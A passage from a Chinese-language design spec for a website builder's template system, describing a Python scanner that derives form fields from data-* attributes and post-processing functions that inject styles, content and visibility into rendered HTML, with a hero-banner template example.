扫描器将 `data-no-resp` 的存在记录为字段定义中的一个布尔标记（`"no_responsive": true`），传给前端。这不是用户可编辑的字段。

---

## 三、扫描器实现规范

### 3.1 文件：`app/core/block_scanner.py`

新增文件，包含模板扫描、字段提取、错误报告的全部逻辑。对外暴露 `scan_template_html(html: str, block_name: str) -> dict` 作为唯一入口。

### 3.2 解析策略

扫描器读取**原始 template.html**（含 Jinja2 标签），用 Python 标准库 `html.parser` 解析。

**对待 Jinja2 的策略：**

`html.parser` 将 `{% %}` 和 `{{ }}` 视为未知标签。测试表明：
- `{% for %}`, `{% if %}` 等 → 解析器将其作为未知开始标签，内部节点正常解析
- `{% endif %}`, `{% endfor %}` 等 → 解析器将其作为未知结束标签
- `{{ variable }}` → 解析器将其作为 data 节点（文本）
- `{# comment #}` → 解析器将其作为注释（忽略）

这意味着 `{% for %}` 内部的 `data-*` 属性可以被正常提取，无需特殊处理。

**扫描步骤：**

```
1. 读入 template.html 全文
2. 用 html.parser 构建 DOM 树
3. 第一遍遍历：定位所有 data-repeat 容器
4. 第二遍遍历：定位 data-repeat 的直接子元素中的 data-repeat-item
   - 中间隔着 {% for %} / {% if %} 等 Jinja2 控制标签的，跳过它们检查其内部
5. 第三遍遍历：对每个 HTML 元素
   a. 判断归属（section 级 / 哪个 data-repeat 的 item 级）
   b. 有 data-key + 有 data-label-* → 收集 CSS 字段（逐个声明模式）
   b2. 有 data-key + 有 data-label → 遍历 style 所有 CSS 属性，从内置字典查中文名，
       排除 data-skip-field 中的属性，自动生成字段（批量模式）
       如果某属性同时有 data-label-* → 逐个声明覆盖自动生成的标签
   c. 无 data-key 但有 data-label-* → CSS 字段，key 直接是 CSS 属性名
   d. 是 <meta data-field> → 收集非 CSS 字段
   e. 有 data-content / data-src / data-href / data-bg / data-attr-style / data-attr-* → 收集内容注入字段
      - 提取注入类型（content/src/href/bg/attr-style/attr）和对应的 fieldKey
      - 如果同一 fieldKey 已有 `<meta>` 声明，复用其 type/default；否则自动推断（data-content→text, data-src→url, 等）
   f. 有 data-show-if → 记录条件可见性引用（不做字段生成，仅记录到 field 元数据中）
6. 第四遍：生成字段 key 并去重
   - 同 scope 内 key 不得重复
   - 不同 scope 重复是合法的
7. 输出字段定义 dict
```

### 3.3 输出格式

扫描器返回与现有 `meta.yaml` **完全兼容**的 dict：

```python
{
    "name": "Hero Banner",
    "category": "content",
    "icon": "hero_banner.svg",
    "description": "首页轮播大图模块，支持图片/视频",
    "fields": [
        # --- section 级 CSS 字段 ---
        {"key": "section_height", "label": "Banner 整体高度", "type": "text",
         "group": "外层样式", "default": "77vh",
         "placeholder": "如 500px 或 77vh", "_css_prop": "height", "_data_key": "section"},
        {"key": "section_max_width", "label": "Banner 最大宽度", "type": "text",
         "group": "外层样式", "default": "100%",
         "placeholder": "如 100%", "_css_prop": "max-width", "_data_key": "section"},

        # --- section 级非 CSS 字段 ---
        {"key": "overlay_enabled", "label": "启用遮罩", "type": "select",
         "group": "遮罩层", "default": "true",
         "options": [{"value": "true", "label": "启用"}, {"value": "false", "label": "不启用"}]},
        {"key": "content_position", "label": "内容排版", "type": "select",
         "group": "外层样式", "default": "居中",
         "options": [{"value": "居中", "label": "居中"},
                     {"value": "居左", "label": "居左"},
                     {"value": "居右", "label": "居右"}],
         "_inject_type": "style", "_data_key": "content"},

        # --- 列表字段 ---
        {"key": "slides", "label": "轮播媒体项", "type": "list",
         "group": "轮播内容", "item_label": "媒体项",
         "item_fields": [
             # item 级 CSS 字段
             {"key": "title_font_size", "label": "标题字号", "type": "text",
              "default": "3rem", "placeholder": "如 3.5rem", "_css_prop": "font-size", "_data_key": "title"},
             {"key": "title_color", "label": "标题颜色", "type": "color",
              "default": "#ffffff", "_css_prop": "color", "_data_key": "title"},
             # item 级非 CSS 字段
             {"key": "type", "label": "媒体类型", "type": "select",
              "default": "image",
              "options": [{"value": "image", "label": "图片"},
                          {"value": "video", "label": "视频"}]},
             {"key": "media", "label": "媒体地址", "type": "url"},
             {"key": "title", "label": "主标题", "type": "text"},
         ]},
    ]
}
```

**输出格式说明：**
- `_css_prop`：内部标记，记录原始 CSS 属性名（中划线格式，如 `max-width`），供 `inject_styles()` 在拼接 style 字符串时使用。不传给前端
- `_data_key`：内部标记，记录该字段所属的 `data-key` 值（如 `content`、`section`、`title`），供 `inject_styles()` 按元素分组样式。不传给前端。**扫描器直接从 HTML 元素的 `data-key` 属性读取，不靠字符串推导**（因为 `rsplit('_', 1)` 对 `max-width`、`background-color` 等多段 CSS 属性名会拆分错误）
- 字段顺序：section 级字段按模板中出现顺序，然后是列表字段
- `name` 提取：从 template.html 中第一个 `{# ... #}` Jinja2 注释提取；兜底用目录名（`hero_banner` → `Hero Banner`）
- `description` 提取：同上注释的第二句；兜底为空字符串
- `category` 和 `icon`：从同级目录结构继承（`blocks/<name>/` 下的 svg 文件），兜底 `"content"` 和空字符串
- `no_responsive`：布尔标记，当根元素有 `data-no-resp` 时为 `true`，否则省略

### 3.4 默认值提取细节

```python
def parse_style_defaults(style_str: str, target_props: list[str]) -> dict[str, str]:
    """
    style="font-size: 3rem; color: #fff;"
    target_props=["font-size", "color"]
    → {"font-size": "3rem", "color": "#fff"}
    """
```

- 以 `;` 切分，再以 `:` 拆 key/value（仅拆分第一个 `:`）
- 属性名 trim 后**小写化**再匹配
- 值 trim 后保留原样（不去引号、不展开简写）
- `data-label-*` 对应的 CSS 属性在 `style` 中不存在 → 扫描器报错
- 属性值中**不能包含 `;`**（CSS 分隔符），但可以包含 `:`（如 `url('https://...')`）

---

## 四、构建器注入规范

### 4.1 涉及文件

| 文件 | 改动内容 |
|---|---|
| `app/core/builder.py` | 修改 `_render_for_language()`，在 `tpl.render()` 之后依次调用 `inject_styles()`、`inject_content()`、`apply_visibility()`、`strip_schema_output()` |
| `app/core/block_styles.py` | 新增文件：列表展开 `expand_repeat_items()` + CSS 注入 `inject_styles()` + 内容注入 `inject_content()` + 条件可见性 `apply_visibility()` + 输出清理 `strip_schema_output()` |
| `app/core/template_loader.py` | 新增 `load_all_block_fields()` 方法，加载模板下所有 block 的字段定义 |

### 4.2 设计原则

**后处理注入**：在字段声明和内容渲染层面，模板只写纯 HTML + data-* 声明，不再需要 Jinja2 `{{ }}` / `{% if %}` / `{% for %}` 做字段级控制。Jinja2 渲染完成后，后处理函数依次完成 CSS 注入、内容注入、条件可见性应用。需注意：少数 Block 因跨数据源（settings.contact）或数据集绑定（all_datasets）仍需保留少量 Jinja2 取值，详见下方"仍保留 Jinja2 的场景"。

| 字段类型 | 声明方式 | 注入方式 |
|---|---|---|
| CSS 字段 | 内联 `style` + `data-label-*` | `inject_styles()` 按 `data-key` 定位元素，追加到 `style` 末尾 |
| 内容字段 | `data-content` / `data-src` / `data-href` / `data-bg` | `inject_content()` 按属性类型替换文本/src/href/背景 |
| 条件可见性 | 自动（空值隐藏）+ `data-show-if` | `apply_visibility()` 按字段值添加/移除 `hidden` 属性 |
| 其他非 CSS 字段 | `<meta data-field>` | 声明字段存在，控制后台表单，值通过内容注入属性或 CSS 字段反映 |

**为什么用后处理而不是模板变量？**

| 对比维度 | 模板变量方式（`{{ s }}` / `{{ is }}` / `{{ }}` / `{% if %}`） | 后处理注入 |
|---|---|---|
| 模板代码 | 需要 `{% set %}`、`{{ }}`、`{% if %}` | 纯 HTML + data-* 属性，模板作者友好 |
| 模板可读性 | 混合 Jinja2 和 HTML，不易阅读 | 纯 HTML，所见即所得 |
| 维护成本 | 四处同步 | 只有 template.html 一处 |
| 可移植性 | 依赖 Jinja2 引擎 | 任何能解析 HTML 的环境都能处理 |

**Jinja2 消除范围：**

`{% for %}` 和 `{% if items %}` 已由 `expand_repeat_items()` 替代，`{{ }}` 变量输出已由内容注入属性（data-content/src/href/bg/attr-style/attr-*）替代，`{% if %}` 条件判断已由 `data-show-if` + 空值自动隐藏替代。模板的常规字段声明和内容渲染不再依赖 Jinja2。

**仍保留 Jinja2 的场景**（与 data-* 机制无关，属于其他系统能力）：
- 数据集绑定（data_grid / product_grid）：`all_datasets`、动态字段映射
- 跨数据源取值（contact_info / contact_form）：`settings.contact`
- 动态分页按钮循环（data_grid）：`{% for p in range(...) %}`
- 数据变换 filter：`truncate` / `split` / `int` / `default` / `replace`

### 4.3 渲染流程

```
Jinja2 渲染（template.html 已无 Jinja2 标签，渲染即原样输出）
  → 原始 HTML（含 data-* 属性、<meta data-field>、默认值、
               仅含 1 份 data-repeat-item 模板项）
  → expand_repeat_items(html, module, block_fields)
  → 列表已展开的 HTML（data-repeat-item 克隆 N 份；空数组时容器被删除）
  → inject_styles(html, module, block_fields)
  → CSS 值已注入的 HTML
  → inject_content(html, module, block_fields)
  → 内容（text/src/href/bg/style）已注入的 HTML
  → apply_visibility(html, module, block_fields)
  → 条件可见性已应用的 HTML（部分元素可能带 hidden）
  → strip_schema_output(html)
  → 最终输出（干净 HTML，无 data-* 和 <meta data-field>）
```

**注意执行顺序：** `expand_repeat_items()` 必须第一个执行（克隆前 data-repeat-item 只有一份，克隆后 N 份），`strip_schema_output()` 必须最后一个执行（前序函数都依赖 data-* 属性定位元素）。

**builder.py 调用方式：**

```python
# app/core/builder.py
from app.core.block_styles import (
    expand_repeat_items, inject_styles, inject_content,
    apply_visibility, strip_schema_output
)

block_fields = template_loader.load_all_block_fields(template_name)

# 在 _render_for_language() 中，每个模块渲染后：
rendered = tpl.render(module=module, settings=settings, ...)
rendered = expand_repeat_items(rendered, module, block_fields)
rendered = inject_styles(rendered, module, block_fields)
rendered = inject_content(rendered, module, block_fields)
rendered = apply_visibility(rendered, module, block_fields)

# 所有模块渲染完成后，整页清理一次：
html = strip_schema_output(html)
```

### 4.4 后处理实现规范

#### 4.4.0 列表展开 —— `expand_repeat_items()`

替代 Jinja2 `{% for %}` 循环和 `{% if items %}` 空列表守护，在后处理阶段根据数据数组克隆模板项。

```python
def expand_repeat_items(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str:
    """
    根据 module.data 中的列表数据，克隆 data-repeat-item 模板项。

    算法：
    1. 找到所有 data-repeat 容器
    2. 从 module.data 取对应 listKey 的数据数组
    3. 数组为空 → 删除整个 data-repeat 容器（等价 {% if items %}.else 不渲染）
    4. 数组非空 → 取容器内唯一的 data-repeat-item 作为模板
       → 克隆 N 份（N = 数组长度）
       → 用克隆出的 N 份替换掉原模板项
    5. 返回展开后的 HTML
    """
```

**关键约束：**
- 模板中每个 `data-repeat` 容器内**只能有一份** `data-repeat-item`（模板项），不可有多份
- 数据数组长度 = 克隆份数。数组长度 0 → 删除容器
- `data-repeat-item` 必须直接位于 `data-repeat` 内部（不容忍中间包裹层）

**示例 —— hero_banner 零 Jinja2 模板：**

```html
<!-- 模板：无需 {% for item in items %}、无需 {% if items %} -->
<div class="hero-banner-slides"
     data-key="slides"
     data-repeat="slides"
     data-repeat-label="轮播媒体项">

  <div class="hero-banner-slide active" data-repeat-item>
    <!-- 模板项：只写一份，expand_repeat_items() 克隆 N 份 -->
    <div class="hero-banner-media">
      <video data-show-if="type" data-show-if-value="video"
             data-key="video" data-src="media"
             autoplay muted loop playsinline></video>
      <div data-show-if="type" data-show-if-value="image"
           data-key="image" data-bg="media"></div>
    </div>
    ...
  </div>
</div>
```

**与 `{% if items %}` 空列表守护的等价：**

```
{% if items %}                    → 数据数组非空 → 保留容器 + 克隆
  <div ... data-repeat="slides">  → 数据数组为空 → 删除整个容器
    ...
  </div>
{% endif %}
```

**注意执行顺序：** `expand_repeat_items()` 必须在 `inject_styles()` / `inject_content()` 之前执行，因为后处理函数依赖数据数组已展开（每个 item 对应一个已克隆的 DOM 元素）。

#### 4.4.1 CSS 注入 —— `inject_styles()`

**第一步：提取字段定义**

从 `block_fields` 中取出当前 block 类型的字段列表，按 section 级 / item 级分组：

```python
block_type = module.get('type', '')
module_data = module.get('data', {}) if isinstance(module, dict) else {}
fields = block_fields.get(block_type, [])

section_css_fields = []   # type != 'list' 且有 _css_prop
item_css_fields = []      # type == 'list' 的子字段（item_fields）中有 _css_prop 的

for f in fields:
    if f.get('type') == 'list':
        for item_f in f.get('item_fields', []):
            if item_f.get('_css_prop'):
                item_css_fields.append(item_f)
    else:
        if f.get('_css_prop'):
            section_css_fields.append(f)
```

**第二步：注入 Section 级 CSS**

找到 HTML 中所有带 `data-key` 属性的元素，跳过 `data-repeat-item` 内部的（留给第四步处理）：

```python
for element in find_elements_with_attr('data-key'):
    if is_inside_repeat_item(element):
        continue

    dk = element.get_attr('data-key')
    user_styles = []
    for f in section_css_fields:
        if f.get('_data_key') != dk:
            continue
        css_prop = f['_css_prop']
        value = module_data.get(f['key'])
        if value is None:
            continue       # 用户未修改，保留模板默认值 → 不追加
        if value != '':
            user_styles.append(f'{css_prop}: {value};')
        # value == '' 表示用户主动清空 → 不追加，CSS 回退到模板默认值

    if user_styles:
        append_to_style_attr(element, ' '.join(user_styles))
```

**第三步：CSS 级联覆盖原理**

```
模板默认: style="font-size: 3rem; color: #ffffff;"
用户改了 font-size 为 2rem，未改 color
→ inject_styles 追加: "font-size: 2rem;"
→ 最终: style="font-size: 3rem; color: #ffffff; font-size: 2rem;"
→ 浏览器: 后面的 font-size: 2rem 覆盖前面的 font-size: 3rem，color 保持 #ffffff
```

**第四步：注入 Item 级 CSS**

找到所有 `data-repeat-item` 元素（按 DOM 顺序），每个对应数据数组中的一项：

```python
repeat_items = find_elements_by_attr('data-repeat-item')

# 找到 module_data 中的列表数据
data_array = []
for f in fields:
    if f.get('type') == 'list':
        data_array = module_data.get(f['key'], [])
        break

for idx, item_elem in enumerate(repeat_items):
    if idx >= len(data_array):
        break
    item_data = data_array[idx]

    # 在该 item_elem 子树内找所有带 data-key 的元素
    for child in find_descendants_with_attr(item_elem, 'data-key'):
        dk = child.get_attr('data-key')
        user_styles = []
        for f in item_css_fields:
            if f.get('_data_key') != dk:
                continue
            css_prop = f['_css_prop']
            value = item_data.get(f['key'])
            if value is None:
                continue
            if value != '':
                user_styles.append(f'{css_prop}: {value};')

        if user_styles:
            append_to_style_attr(child, ' '.join(user_styles))
```

**第五步：序列化回 HTML**

将修改后的元素序列化为 HTML 字符串返回。

> **实现备注：** 如果项目不引入第三方 HTML 解析库，可用 Python 标准库 `html.parser.HTMLParser` 配合字符串操作实现。核心逻辑：定位 `data-key="xxx"` → 找到所在标签的 `style="..."` → 在闭合引号前追加用户值。`data-repeat-item` 的深度匹配可用简单的栈计数器实现，不必构建完整 DOM 树。

#### 4.4.2 内容注入 —— `inject_content()`

处理 `data-content`、`data-src`、`data-href`、`data-bg` 四种注入属性，替代 Jinja2 `{{ }}`。

```python
def inject_content(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str:
    """
    后处理注入内容值到渲染后的 HTML 中。

    处理 data-content   → 替换元素文本
         data-src       → 设置 src 属性
         data-href      → 设置 href 属性
         data-bg        → 追加 background-image 到 style
         data-attr-style → 追加整段 CSS 字符串到 style

    参数同 inject_styles().
    """
```

**算法步骤：**

**第一步：提取内容字段定义**

```python
block_type = module.get('type', '')
module_data = module.get('data', {}) if isinstance(module, dict) else {}
fields = block_fields.get(block_type, [])

section_content_fields = []  # type != 'list'，有 _inject_type
item_content_fields = []     # type == 'list' 的 item_fields 中有 _inject_type 的

for f in fields:
    if f.get('type') == 'list':
        for item_f in f.get('item_fields', []):
            if item_f.get('_inject_type'):  # 'content' | 'src' | 'href' | 'bg'
                item_content_fields.append(item_f)
    else:
        if f.get('_inject_type'):
            section_content_fields.append(f)
```

> **`_inject_type` 标记：** 扫描器在解析 `data-content` / `data-src` / `data-href` / `data-bg` / `data-attr-style` 时，为字段定义添加 `_inject_type` 内部标记，值分别为 `"content"`、`"src"`、`"href"`、`"bg"`、`"style"`。同时记录 `_data_key`（元素所在 `data-key` 值），用于后处理定位目标元素。

**第二步：注入 Section 级内容**

```python
for element in find_elements_with_attr_in('data-content|data-src|data-href|data-bg'):
    if is_inside_repeat_item(element):
        continue

    dk = element.get_attr('data-key') or ''
    for f in section_content_fields:
        if f.get('_data_key') != dk:
            continue
        value = module_data.get(f['key'])
        if value is None:
            continue

        inject_type = f['_inject_type']
        if inject_type == 'content':
            if value:
                element.set_text_content(value)
        elif inject_type == 'src':
            element.set_attr('src', value)
        elif inject_type == 'href':
            element.set_attr('href', value)
        elif inject_type == 'bg':
            if value:
                append_to_style_attr(element, f'background-image: url({value});')
        elif inject_type == 'style':
            if value:
                append_to_style_attr(element, value)
```

**第三步：注入 Item 级内容**

```python
repeat_items = find_elements_by_attr('data-repeat-item')
data_array = []  # 同 inject_styles() 的查找逻辑
for f in fields:
    if f.get('type') == 'list':
        data_array = module_data.get(f['key'], [])
        break

for idx, item_elem in enumerate(repeat_items):
    if idx >= len(data_array):
        break
    item_data = data_array[idx]

    for child in find_descendants_with_attr_in(item_elem, 'data-content|data-src|data-href|data-bg'):
        dk = child.get_attr('data-key') or ''
        for f in item_content_fields:
            if f.get('_data_key') != dk:
                continue
            value = item_data.get(f['key'])
            if value is None:
                continue

            inject_type = f['_inject_type']
            if inject_type == 'content':
                if value:
                    child.set_text_content(value)
            elif inject_type == 'src':
                child.set_attr('src', value)
            elif inject_type == 'href':
                child.set_attr('href', value)
            elif inject_type == 'bg':
                if value:
                    append_to_style_attr(child, f'background-image: url({value});')

    # 注入 section 级字段到 item 级元素（跨作用域引用，如 content_position）
    for child in find_descendants_with_attr_in(item_elem, "data-attr-style"):
        dk = child.get_attr("data-key") or ""
        for f in section_content_fields:
            if f.get("_data_key") != dk:
                continue
            if f.get("_inject_type") != "style":
                continue
            value = module_data.get(f["key"])
            if value is None:
                continue
            append_to_style_attr(child, value)
```

#### 4.4.3 条件可见性 —— `apply_visibility()`

处理空值自动隐藏、`data-show-if` 显式条件和互斥组，替代 Jinja2 `{% if %}`。

```python
def apply_visibility(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str:
    """
    后处理应用条件可见性规则。

    规则 1（自动隐藏）：有 data-content/src/href/bg 的元素，字段值为空 → hidden
    规则 2（显式条件）：有 data-show-if 的元素，字段值不匹配 → hidden
    规则 3（覆盖）：data-hide-when-empty="false" 的元素，跳过规则 1
    规则 4（互斥组）：同一父元素下 data-show-if 同字段的元素构成互斥组，仅保留匹配项
    """
```

**算法步骤：**

**第一步：自动空值隐藏**（同前，略）

**第二步：显式条件判断 (`data-show-if`)**（同前，略）

**第三步：互斥组处理 (`data-show-if` 组)**

处理同一父元素下同字段名的 `data-show-if` 互斥组，替代 Jinja2 `{% if %}`/`{% elif %}`/`{% else %}` 链。

```python
# 按 (父元素, data-show-if 字段名) 分组
groups: dict[tuple, list] = {}
for element in find_elements_with_attr('data-show-if'):
    parent = element.parent
    field_key = element.get_attr('data-show-if')
    key = (parent, field_key)
    if key not in groups:
        groups[key] = []
    groups[key].append(element)

# 处理每个互斥组
for (parent, field_key), elements in groups.items():
    value = get_field_value(elements[0], field_key, module_data, item_data_array)
    
    # 查找匹配的元素
    matched = None
    default_elem = None
    for el in elements:
        if el.get_attr('data-show-if-default') is not None:
            default_elem = el
        expected = el.get_attr('data-show-if-value') or ''
        if expected:
            expected_values = [v.strip() for v in expected.split(',')]
            if value in expected_values:
                matched = el
                break
    
    # 决定保留谁
    keep = matched or default_elem
    
    # 删除组内不匹配的元素
    for el in elements:
        if el is not keep:
            parent.remove_child(el)  # 从 DOM 中删除，不是 hidden
```

**`get_field_value()` 辅助函数：**

```python
def get_field_value(element, field_key, module_data, item_data_array):
    """根据元素在 DOM 中的位置，从 section 级或 item 级数据中取值。"""
    if is_inside_repeat_item(element):
        idx = get_repeat_item_index(element)
        if idx is not None and idx < len(item_data_array):
            return item_data_array[idx].get(field_key)
    else:
        return module_data.get(field_key)
    return None
```

#### 4.4.4 字段缓存策略

`block_fields` 由 builder.py 在 build 周期开始时通过 `load_all_block_fields()` 获取，作为参数传入 `inject_styles()` 等后处理函数。函数本身无内部状态，不依赖模块级变量。

```python
# block_styles.py —— 无状态设计，所有函数签名一致
def expand_repeat_items(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str: ...
def inject_styles(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str: ...
def inject_content(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str: ...
def apply_visibility(html: str, module: dict, block_fields: dict[str, list[dict]]) -> str: ...
def strip_schema_output(html: str) -> str: ...
```

> **设计意图：** 旧方案用 `_block_fields_cache` 模块级变量 + `set_block_fields_cache()` 注入依赖，增加了隐式耦合。新方案改为参数传递，后处理函数都是无状态的纯函数，更易测试和调试。

### 4.5 `strip_schema_output()` —— 输出清理

所有后处理步骤（`inject_styles` → `inject_content` → `apply_visibility`）完成后，对整页 HTML 做三轮正则清理。**必须在最后调用**（前面的步骤依赖 data-* 属性定位元素）。

```python
import re

# 第一轮：移除 <meta data-field> 标签
META_FIELD_RE = re.compile(r'<meta\s+data-field[^>]*/?>', re.IGNORECASE)

# 第二轮：移除有值的 Schema 专用属性
SCHEMA_ATTR_RE = re.compile(
    r'\s+('
    r'data-label-[a-zA-Z0-9\-]+|'
    r'data-group-[a-zA-Z0-9\-]+|'
    r'data-placeholder-[a-zA-Z0-9\-]+|'
    r'data-placeholder|'
    r'data-key|'
    r'data-repeat|'
    r'data-repeat-item|'
    r'data-repeat-label|'
    r'data-repeat-group|'
    r'data-content|'
    r'data-src|'
    r'data-href|'
    r'data-bg|'
    r'data-attr-[a-zA-Z0-9\-]+|'
    r'data-attr-style|'
    r'data-show-if|'
    r'data-show-if-value|'
    r'data-hide-when-empty'
    r')="[^"]*"',
    re.IGNORECASE
)

# 第三轮：移除无值的布尔 Schema 属性
SCHEMA_BOOL_ATTR_RE = re.compile(
    r'\s+('
    r'data-no-resp|'
    r'data-show-if-default'
    r')\b',
    re.IGNORECASE
)

def strip_schema_output(html: str) -> str:
    html = META_FIELD_RE.sub('', html)
    html = SCHEMA_ATTR_RE.sub('', html)
    html = SCHEMA_BOOL_ATTR_RE.sub('', html)
    return html
```

调用位置：`builder.py` 的 `_render_for_language()` 中，所有模块的后处理函数执行完毕后，对整页 HTML 调用一次。

> **已知局限：** 上述正则方案在属性值含转义引号 `\"` 或属性跨行时有边界情况。后续可改用 `html.parser` 方案（解析 DOM → `del elem.attrs['data-*']` → serialize），彻底规避正则风险。详见 §十第 23 条。

### 4.6 `load_all_block_fields()` —— 加载模板全部 block 字段定义

`template_loader.py` 新增方法，builder.py 调用它获取当前模板所有 block 的字段定义，传入各后处理函数。

```python
# app/core/template_loader.py

def load_all_block_fields(self, template_name: str) -> dict[str, list[dict]]:
    """
    加载指定模板下所有 block 的字段定义。

    返回: {block_type: [field_dict, ...], ...}
    例: {"hero_banner": [...], "feature_grid": [...], ...}

    流程:
    1. 遍历 site_templates/<template_name>/blocks/ 下的所有子目录
    2. 对每个 block，读取 template.html
    3. 检测是否使用了 data-* 字段声明（任一条件成立即为是）：
       - 有 `data-label` 或 `data-label-*`（CSS 字段声明）
       - 有 `data-content` / `data-src` / `data-href` / `data-bg` / `data-attr-style` / `data-attr-*`（内容注入）
       - 有 `data-repeat`（可重复列表）
       - 有 `<meta data-field>`（非 CSS 字段声明）
       → 是 → 调用 block_scanner.scan_template_html(html_path) 提取字段
       → 否 → 读取 meta.yaml（旧方式）
    4. 汇总为 {block_type: fields} dict
    """
    blocks_dir = os.path.join(self.template_dir, 'blocks')
    result = {}
    for block_name in os.listdir(blocks_dir):
        block_path = os.path.join(blocks_dir, block_name)
        if not os.path.isdir(block_path):
            continue
        html_path = os.path.join(block_path, 'template.html')
        if not os.path.exists(html_path):
            continue
        with open(html_path, 'r', encoding='utf-8') as f:
            html = f.read()
        if _has_data_attributes(html):
            fields = scan_template_html(html, block_name)
        else:
            fields = self._read_meta_yaml(block_path)
        result[block_name] = fields
    return result
```

**`_has_data_attributes()` 辅助函数：**

```python
import re

# 匹配任一 data-* 字段声明属性（含注入、列表、CSS 批量/逐个模式）
_HAS_DATA_ATTRS_RE = re.compile(
    r'\bdata-(?:label|content|src|href|bg|attr-style|attr-[a-z]+|repeat|'
    r'skip-field|placeholder|group-[a-z]+|show-if|hide-when-empty)=' 
    r'|'
    r'<meta\s+[^>]*\bdata-field=',
    re.IGNORECASE
)

def _has_data_attributes(html: str) -> bool:
    """快速检测 template.html 是否使用了 data-* 字段声明系统。"""
    return bool(_HAS_DATA_ATTRS_RE.search(html))
```

**缓存策略：** builder.py 在每个 build 周期开始时调用一次 `load_all_block_fields()`，结果作为参数传入各后处理函数。同一模板的不同页面构建复用此结果。切换模板时重新加载。

---

## 五、完整示例

§5.1–§5.3 以 hero_banner（轮播大图模块）为例展示改造全貌，§5.4 以 feature_grid（功能特色网格）为例展示多元素多字段场景下的改造模式。

**模板作者的视角：** 只写纯 HTML + data-* 属性声明。不写任何 Jinja2 代码。`{% for %}` 循环和 `{% if items %}` 空列表守护由 `expand_repeat_items()` 后处理替代。CSS 注入、内容注入、条件可见性均由后处理完成。

### 5.1 改造后的 template.html

```html
{# Hero Banner 模块 - 全屏轮播。 #}
{#
  ══════════ 零 Jinja2 模板 ══════════
  无 {% for %}、{% if %}、{{ }}、{% set %}
  列表展开由 expand_repeat_items() 处理
  内容注入由 inject_styles() / inject_content() / apply_visibility() 处理
#}
{#
  ══════════ SECTION 级 CSS 字段 ══════════
  内联 style 中 8 个 CSS 属性 → data-label="Banner" 自动生成全部字段
#}
<section class="section hero-banner" id="heroBanner"
         style="height: 77vh; max-width: 100%;
                padding-top: 0; padding-right: 0;
                padding-bottom: 0; padding-left: 0;
                background: transparent;"
         data-no-resp
         data-key="section"
         data-label="Banner">

  <div class="container" style="height: 100%; max-width: none;">

    {# ══════════ 列表容器 ══════════
        expand_repeat_items() 根据 module.data.slides 的长度
        自动克隆 data-repeat-item。数组为空时删除整个容器。 #}
    <div class="hero-banner-slides"
         data-key="slides"
         data-repeat="slides"
         data-repeat-label="轮播媒体项"
         data-repeat-group="轮播内容">

      {# 模板项：只写一份，expand_repeat_items() 克隆 N 份 #}
      <div class="hero-banner-slide active" data-repeat-item>

        {#
          --- 媒体区 ---
          data-show-if + data-show-if-value 替代 {% if item.type == 'video' %}
          data-src 替代 src="{{ item.media }}"
          data-bg 替代 style="background-image: url('{{ item.media }}')"
        #}
        <div class="hero-banner-media">
          <video class="hero-banner-video"
                 data-show-if="type" data-show-if-value="video"
                 data-key="video" data-src="media"
                 autoplay muted loop playsinline></video>
          <div class="hero-banner-image"
               data-show-if="type" data-show-if-value="image"
               data-key="image" data-bg="media"></div>
        </div>

        {#
          --- 遮罩层 ---
          data-show-if 替代 {% if module.data.overlay_enabled != 'false' %}
        #}
        <div class="hero-banner-overlay"
             data-show-if="overlay_enabled"
             data-show-if-value="true"></div>

        {#
          --- 内容区 ---
          max-width → inject_styles() 注入用户值
          data-attr-style → inject_content() 注入整段 CSS（替代 banner_align 多属性联动）
        #}
        <div class="hero-banner-content"
             style="max-width: 900px; text-align: center;"
             data-key="content"
             data-label="内容区"
             data-attr-style="content_position"
             data-placeholder="如 1200px">

          {#
            --- 主标题 ---
            data-content 注入文本，data-label 自动生成 CSS 字段标签
            空值自动隐藏 → 替代 {% if item.title %}
          #}
          <h1 class="hero-banner-title"
              style="font-size: 3rem; color: #ffffff;"
              data-key="title"
              data-content="title"
              data-label="标题">主标题占位文本</h1>

          {#
            --- 副标题 ---
            data-content 注入，空值自动隐藏
          #}
          <p class="hero-banner-subtitle"
             style="font-size: 1.25rem; color: rgba(255,255,255,0.9);"
             data-key="subtitle"
             data-content="subtitle"
             data-label="副标题">副标题占位文本</p>

          {#
            --- 按钮 ---
            data-content + data-href + data-attr-target + data-label
          #}
          <div class="hero-banner-actions">
            <a class="btn btn-primary btn-lg"
               style="font-size: 1rem; color: #ffffff;
                      background-color: #067a7a;"
               data-content="primaryBtn"
               data-href="primaryBtnLink"
               data-attr-target="primaryBtnLinkTarget"
               data-key="btn"
               data-label="按钮">主按钮</a>

            <a class="btn btn-secondary btn-lg"
               data-key="btn-secondary"
               data-content="secondaryBtn"
               data-href="secondaryBtnLink">副按钮</a>
          </div>
        </div>

        {# ══════════ Item 级字段声明 ══════════ #}
        <meta data-field="type" data-label="媒体类型" data-type="select"
              data-options="图片:image, 视频:video" data-default="image">
        <meta data-field="media" data-label="媒体地址" data-type="url">
        <meta data-field="title" data-label="主标题" data-type="text">
        <meta data-field="subtitle" data-label="副标题" data-type="text">
        <meta data-field="primaryBtn" data-label="主按钮文字" data-type="text">
        <meta data-field="primaryBtnLink" data-label="主按钮链接" data-type="url">
        <meta data-field="primaryBtnLinkTarget" data-label="新窗口打开" data-type="select"
              data-options="是:_blank, 否:" data-default="">
        <meta data-field="secondaryBtn" data-label="副按钮文字" data-type="text">
        <meta data-field="secondaryBtnLink" data-label="副按钮链接" data-type="url">
      </div>
    </div>
  </div>

</section>

{# ══════════ Section 级字段声明 ══════════ #}
<meta data-field="overlay_enabled" data-label="启用遮罩"
      data-type="select" data-options="启用:true, 不启用:false"
      data-default="true" data-group="遮罩层">
<meta data-field="content_position" data-label="内容排版"
      data-type="select" data-options="居中:left： 50%; transform： translate(-50%, -50%);, 居左:left： 5%; transform： translateY(-50%);, 居右:left： auto; right： 5%; transform： translateY(-50%);"
      data-default="居中" data-group="外层样式">

<script>
(function() {
  var banner = document.getElementById('heroBanner');
  if (!banner) return;
  var slides = banner.querySelectorAll('.hero-banner-slide');
  var dots = banner.querySelectorAll('.hero-banner-dot');
  var prevBtn = banner.querySelector('.hero-banner-nav-prev');
  var nextBtn = banner.querySelector('.hero-banner-nav-next');
  var current = 0;
  var total = slides.length;
  if (total <= 1) return;

  function showSlide(index) {
    slides.forEach(function(s, i) { s.classList.toggle('active', i === index); });
    dots.forEach(function(d, i) { d.classList.toggle('active', i === index); });
    current = index;
